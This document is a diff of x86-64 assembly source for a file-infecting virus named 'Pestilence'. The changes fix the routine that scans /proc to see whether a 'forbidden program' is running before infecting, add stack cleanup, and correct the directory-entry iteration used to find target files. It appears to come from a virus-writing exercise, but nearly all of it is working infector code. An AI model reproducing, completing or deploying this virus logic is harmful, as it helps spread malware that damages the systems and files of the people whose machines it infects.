@@ -132,7 +132,7 @@ section .text
 
         ; concatenamos "/proc/d_name" + "/exe"
 
-        mov rsi, exe_string
+        lea rsi, [exe_string]
         mov rcx, 5
         ; rcx ya contiene la len a escribir
         cld
@@ -147,27 +147,35 @@ section .text
         syscall
         test rax, rax
         ; esto puede pasar a menudo por permisos. Si sucede, seguimos.
-        jle .check_dir_in_proc
+        jle .cleanup_and_check_dir_in_proc
 
-        lea rdi, [forbidden_prog + 4]
-        ; apuntamos con rsi al final de la cadena devuelta por readlink
+        lea rdi, [forbidden_prog + 3]
+        ; apuntamos con rsi al ultimo caracter de la cadena devuelta por readlink
         add rsi, rax
+        dec rsi
         mov rcx, 4
         std
         rep cmpsb
-
         ; si está el forbidden program corriendo, saltamos al entrypoint
         ; original (no infectamos)
-        je .jump_to_host
+        je .cleanup_and_jump_to_host
 
         ; siguiente directorio.
+        jmp .cleanup_and_check_dir_in_proc
+
+    .cleanup_and_jump_to_host:
+        TRACE_TEXT hello, 11
+        add rsp, 256
+        jmp .jump_to_host
+
+    .cleanup_and_check_dir_in_proc:
+        add rsp, 256
         jmp .check_dir_in_proc
 
     .close_proc_dir:
         mov rax, SC_CLOSE
         mov rdi, VAR(Pestilence.fd_proc)
         syscall
-
 
 ; ----------------------------------------- VIRUS -------------------------------------------------------------------
 
@@ -204,8 +212,8 @@ section .text
     ; getdents64 does not return one directory entry. It returns as many directory entries as it can
     ; fit in the buffer passed. This is why the following iteration checks N directory entries and not just one.
 
-    ; rdi = dirent_buffert[0]
-    ; r12 = offset from dirent_buffert[0]
+    ; rdi = dirent_buffer[0]
+    ; r12 = offset from dirent_buffer[0]
     ; rax = total bytes read in getdents
     .check_for_files_in_dirents:
         ; if offset == total_bytes, next entry.
@@ -458,6 +466,7 @@ section .text
         mov rsi, VAR(Pestilence.dir_name_pointer)
 
     .find_null:
+        cld
         lodsb               ; al = *rsi++
         test al, al
         jnz .find_null
